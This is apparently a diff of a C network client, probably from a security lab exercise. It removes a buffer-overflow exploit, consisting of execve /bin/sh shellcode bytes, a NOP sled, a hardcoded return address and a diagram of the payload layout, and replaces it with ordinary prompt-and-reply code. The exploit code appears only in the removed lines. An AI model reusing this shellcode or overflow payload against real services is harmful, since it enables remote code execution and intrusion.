@@ -11,16 +11,10 @@
 #include <time.h>
 
 #define	PORTNUM	8001
-#define	BLENGTH	128
-#define	ALENGTH	32
+#define	BLENGTH	256
+#define	ALENGTH	128
 
-#define OFFSET 41
-
-/* the correct shellcode size = 22 */
-char shellcode[]=
-			"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
-;
-
+static void
 loop(int s)
 {
   char buffer[BLENGTH];
@@ -34,49 +28,13 @@ loop(int s)
     /* Receive prompt */
     if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
       break;
-    }	
-    int i;
+    }
 
-      
-    
-    /* Simulate the fact the user type 1 */
-    strncpy(buffer, "1\n", sizeof(buffer)-1);
-    buffer[sizeof(buffer)-1] = '\0';
-    
+    /* Display prompt */
+    fputs(buffer, stdout);
 
-	/* send user response */
-    send(s, (void *)buffer, BLENGTH, 0); 
-    
-    
-    /////////////////////////////////////////////////////////
-    for(i = 0 ; i < OFFSET ; i++ ) {
-    buffer[i] = 0x90;
-   }
-    
-    /* Put exploit code at start of buffer */
-   memcpy(buffer+5, shellcode, strlen(shellcode));
-    
-    //put return address at end of buffer /
-   memcpy(buffer+OFFSET-5, "\x38\x33\xdc\xb7", 4); 
-   /////////////////////////////////////////////////////////////////// 
-    
-    
-	
-	// NOPS in the buffer
-   // for(i = 0 ; i < 15 ; i++ ) buffer[i] = 0x90; 
-	
-	// Shellcode at the middle of the buffer
-   // memcpy(buffer+14, shellcode, strlen(shellcode));  
-	
-	/* return addr at the end of the buffer. */
-	//memcpy(buffer+36, "\x38\x33\xdc\xb7", 4);
-	
-	/* So our payload looks like : 
-	*  _____________________________________________
-	* | NOPS	|	shellcode	|	return addr		|
-	* |____14____|________22_____|______4____________|
-	*  0		13-14			35	36				39/
-	
+    /* Read user response */
+    fgets(buffer, BLENGTH, stdin);
 
     /* Send user response */
     send(s, (void *)buffer, BLENGTH, 0);
